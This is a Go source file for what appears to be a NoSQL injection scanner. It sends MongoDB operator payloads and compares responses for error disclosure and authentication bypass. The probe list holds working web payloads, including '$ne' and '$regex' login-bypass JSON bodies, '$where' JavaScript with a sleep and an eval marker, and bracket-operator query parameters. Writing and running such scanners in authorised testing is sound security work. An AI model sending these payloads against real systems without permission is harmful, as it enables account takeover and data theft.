package nosql

import (
	"encoding/json"
	"net/url"
	"strings"
)

// Probe describes a NoSQL injection attempt.
type Probe struct {
	Name        string
	Value       string
	Signal      string
	ContentType string
	Mode        string // query, json_body, bracket_query
}

// ResponseContext carries HTTP metadata used to reduce false positives.
type ResponseContext struct {
	BaselineBody   string
	ProbeBody      string
	ControlBody    string
	BaselineStatus int
	ProbeStatus    int
	ControlStatus  int
}

// Probes returns MongoDB/NoSQL operator injection templates.
func Probes(param string) []Probe {
	if param == "" {
		param = "username"
	}
	return []Probe{
		{Name: "ne_operator", Value: `{"$ne":null}`, Signal: "operator_injection", Mode: "query"},
		{Name: "gt_operator", Value: `{"$gt":""}`, Signal: "operator_injection", Mode: "query"},
		{Name: "regex_operator", Value: `{"$regex":".*"}`, Signal: "regex_injection", Mode: "query"},
		{Name: "where_js", Value: `{"$where":"this.password.match(/.*/)"}`, Signal: "where_injection", Mode: "query"},
		{Name: "where_eval", Value: `{"$where":"(function(){throw new Error(\"AKCA_NOSQL_\"+(71*73)+\"_EVAL\")})()"}`, Signal: "where_eval_injection", Mode: "query"},
		{Name: "where_sleep", Value: `{"$where":"sleep(5000)"}`, Signal: "where_injection", Mode: "query"},
		{Name: "or_operator", Value: `{"$or":[{"` + param + `":{"$ne":""}},{"password":{"$ne":""}}]}`, Signal: "auth_bypass", Mode: "json_body", ContentType: "application/json"},
		{Name: "exists_operator", Value: `{"$exists":true}`, Signal: "operator_injection", Mode: "query"},
		{Name: "in_operator", Value: `{"$in":["admin","root","user"]}`, Signal: "operator_injection", Mode: "query"},
		{Name: "expr_gt", Value: `{"$expr":{"$gt":["$password",""]}}`, Signal: "operator_injection", Mode: "query"},
		{Name: "js_truthy", Value: `' || '1'=='1`, Signal: "js_injection", Mode: "query"},
		{Name: "json_login_bypass", Value: buildLoginBypassJSON(param), Signal: "auth_bypass", Mode: "json_body", ContentType: "application/json"},
		{Name: "json_ne_bypass", Value: buildNEBypassJSON(param), Signal: "auth_bypass", Mode: "json_body", ContentType: "application/json"},
		{Name: "json_gt_pair", Value: `{"` + param + `":{"$gt":""},"password":{"$gt":""}}`, Signal: "auth_bypass", Mode: "json_body", ContentType: "application/json"},
		{Name: "bracket_ne", Value: "", Signal: "bracket_injection", Mode: "bracket_query"},
		{Name: "bracket_gt", Value: "", Signal: "bracket_injection", Mode: "bracket_query"},
		{Name: "bracket_regex", Value: "", Signal: "bracket_injection", Mode: "bracket_query"},
	}
}

// ProbesForTarget returns probes appropriate for the endpoint surface.
func ProbesForTarget(param, endpointURL, contentType, method string) []Probe {
	all := Probes(param)
	jsonSurface := isJSONSurface(contentType, method, endpointURL)
	loginSurface := isLoginLikeEndpoint(endpointURL)

	out := make([]Probe, 0, len(all))
	for _, p := range all {
		switch p.Mode {
		case "json_body":
			if !jsonSurface {
				continue
			}
			if p.Signal == "auth_bypass" && !loginSurface {
				continue
			}
		case "bracket_query":
			if !jsonSurface && !loginSurface {
				continue
			}
		}
		out = append(out, p)
	}
	if len(out) == 0 {
		// Keep operator query probes only when nothing else matched.
		for _, p := range all {
			if p.Mode == "query" {
				out = append(out, p)
			}
		}
	}
	return out
}

// ControlBody returns a benign JSON body for differential confirmation.
func ControlBody(param string) string {
	if param == "" {
		param = "username"
	}
	body := map[string]string{
		param:      "akca_nosql_control",
		"password": "akca_nosql_control",
	}
	raw, _ := json.Marshal(body)
	return string(raw)
}

func buildLoginBypassJSON(param string) string {
	body := map[string]interface{}{
		param:      map[string]string{"$ne": ""},
		"password": map[string]string{"$ne": ""},
	}
	raw, _ := json.Marshal(body)
	return string(raw)
}

func buildNEBypassJSON(param string) string {
	body := map[string]interface{}{
		param: map[string]string{"$regex": ".*"},
	}
	raw, _ := json.Marshal(body)
	return string(raw)
}

// BracketProbeURL appends MongoDB bracket-operator query params.
func BracketProbeURL(endpointURL, param, op string) (string, error) {
	u, err := url.Parse(endpointURL)
	if err != nil {
		return "", err
	}
	q := u.Query()
	switch op {
	case "ne":
		q.Set(param+"[$ne]", "akca")
	case "gt":
		q.Set(param+"[$gt]", "")
	default:
		q.Set(param+"[$regex]", ".*")
	}
	u.RawQuery = q.Encode()
	return u.String(), nil
}

func isJSONSurface(contentType, method, endpointURL string) bool {
	ct := strings.ToLower(contentType)
	if strings.Contains(ct, "json") {
		return true
	}
	// API responses are frequently served with a missing or incorrect content
	// type. Path semantics are sufficient to enable low-impact operator and
	// bracket probes for GET as well as body-capable methods; auth-bypass JSON
	// bodies remain restricted to login-like endpoints below.
	lower := strings.ToLower(endpointURL)
	return strings.Contains(lower, "/api") || strings.Contains(lower, "/graphql") ||
		strings.Contains(lower, "/v1/") || strings.Contains(lower, "/v2/") ||
		strings.Contains(lower, "/v3/")
}

func isLoginLikeEndpoint(endpointURL string) bool {
	return IsLoginLikeEndpoint(endpointURL)
}

// IsLoginLikeEndpoint reports whether the URL looks like an authentication endpoint.
func IsLoginLikeEndpoint(endpointURL string) bool {
	lower := strings.ToLower(endpointURL)
	for _, part := range []string{"/login", "/signin", "/sign-in", "/authenticate", "/auth/", "/oauth/token", "/session", "/token"} {
		if strings.Contains(lower, part) {
			return true
		}
	}
	return false
}

// Mongo and in-memory engine error strings (avoid generic "syntax error", "javascript", etc.).
var mongoErrorMarkers = []string{
	"mongoerror", "mongoservererror", "unknown operator", "bad query",
	"invalid bson", "failed to parse", "cast to objectid failed",
	"bson type", "cannot use type", "$where not allowed", "unrecognized field",
	"in csp mode, sift does not support strings", "in \"$where\" condition",
	"function compilation failed", "evalmachine.<anonymous>",
}

var authFailureMarkers = []string{
	"invalid credentials", "invalid username", "invalid password", "login failed",
	"authentication failed", "unauthorized", "incorrect password", "wrong password",
	"bad credentials", "access denied", "invalid login",
}

// Strong success indicators — avoid bare "session", "profile", "welcome".
var authSuccessPatterns = []string{
	`"access_token"`, `"refresh_token"`, `"id_token"`, `"token_type"`,
	`"jwt"`, `"bearer"`, `"logged_in":true`, `"authenticated":true`,
	`"is_authenticated":true`, `"login_successful"`, `"login successful"`,
	`"auth_token"`, `"session_id"`, `"set-cookie"`,
}

// Analyze compares baseline and probe responses for NoSQL injection signals.
func Analyze(baselineBody, probeBody string, probe Probe) (bool, string) {
	return AnalyzeWithContext(ResponseContext{
		BaselineBody: baselineBody,
		ProbeBody:    probeBody,
	}, probe)
}

// AnalyzeWithContext applies stricter differential checks using status codes and control body.
func AnalyzeWithContext(ctx ResponseContext, probe Probe) (bool, string) {
	if ctx.ProbeBody == "" {
		return false, ""
	}
	if strings.Contains(ctx.ProbeBody, "AKCA_NOSQL_5183_EVAL") {
		return true, "nosql_code_execution_eval"
	}
	probeLower := strings.ToLower(ctx.ProbeBody)
	baseLower := strings.ToLower(ctx.BaselineBody)
	controlLower := strings.ToLower(ctx.ControlBody)

	if sig := detectMongoError(probeLower, baseLower); sig != "" {
		return true, sig
	}

	switch probe.Signal {
	case "auth_bypass":
		return analyzeAuthBypass(ctx, probeLower, baseLower, controlLower)
	case "operator_injection", "regex_injection", "where_injection", "where_eval_injection", "js_injection", "bracket_injection":
		// Operator probes only report on Mongo error disclosure (handled above).
		return false, ""
	default:
		return false, ""
	}
}

func detectMongoError(probeLower, baseLower string) string {
	hits := 0
	for _, kw := range mongoErrorMarkers {
		if strings.Contains(probeLower, kw) && !strings.Contains(baseLower, kw) {
			hits++
		}
	}
	if hits >= 1 && (strings.Contains(probeLower, "mongo") || strings.Contains(probeLower, "bson") || strings.Contains(probeLower, "$")) {
		return "nosql_error_disclosure"
	}
	if hits >= 2 {
		return "nosql_error_disclosure"
	}
	return ""
}

// IsMongoErrorDisclosure exposes the provider-specific error classifier to the
// module proof guard. A reproduced Mongo/BSON/operator error is typed evidence
// even when the application correctly returns HTTP 500; generic 5xx pages are
// still rejected because they do not contain these markers.
func IsMongoErrorDisclosure(body, baseline string) bool {
	return detectMongoError(strings.ToLower(body), strings.ToLower(baseline)) != ""
}

func analyzeAuthBypass(ctx ResponseContext, probeLower, baseLower, controlLower string) (bool, string) {
	if ctx.ProbeBody == ctx.BaselineBody {
		return false, ""
	}
	// Control request must still look like failure — otherwise any POST diff would fire.
	if ctx.ControlBody != "" {
		if authSuccessScore(probeLower) <= authSuccessScore(controlLower) {
			return false, ""
		}
		if authFailureScore(probeLower) >= authFailureScore(controlLower) && !statusImproved(ctx) {
			return false, ""
		}
	}

	if !statusImproved(ctx) && !failureCleared(probeLower, baseLower) {
		return false, ""
	}
	if authSuccessScore(probeLower) == 0 {
		return false, ""
	}
	if authFailureScore(baseLower) == 0 && !isFailureStatus(ctx.BaselineStatus) && authSuccessScore(probeLower) < 2 {
		return false, ""
	}
	return true, "nosql_auth_bypass"
}

func statusImproved(ctx ResponseContext) bool {
	if isFailureStatus(ctx.BaselineStatus) && ctx.ProbeStatus >= 200 && ctx.ProbeStatus < 300 {
		return true
	}
	if ctx.BaselineStatus >= 400 && ctx.ProbeStatus >= 200 && ctx.ProbeStatus < 300 {
		return true
	}
	return false
}

func isFailureStatus(code int) bool {
	return code == 401 || code == 403 || code == 422
}

func failureCleared(probeLower, baseLower string) bool {
	baseFail := authFailureScore(baseLower)
	if baseFail == 0 {
		return false
	}
	return authFailureScore(probeLower) < baseFail
}

func authFailureScore(body string) int {
	score := 0
	for _, kw := range authFailureMarkers {
		if strings.Contains(body, kw) {
			score++
		}
	}
	return score
}

func authSuccessScore(body string) int {
	score := 0
	lower := strings.ToLower(body)
	for _, pat := range authSuccessPatterns {
		if strings.Contains(lower, strings.ToLower(pat)) {
			score++
		}
	}
	// Structured JWT-like value is a strong signal.
	if strings.Count(body, ".") >= 2 && (strings.Contains(lower, "eyj") || strings.Contains(lower, `"token":"`)) {
		score += 2
	}
	return score
}
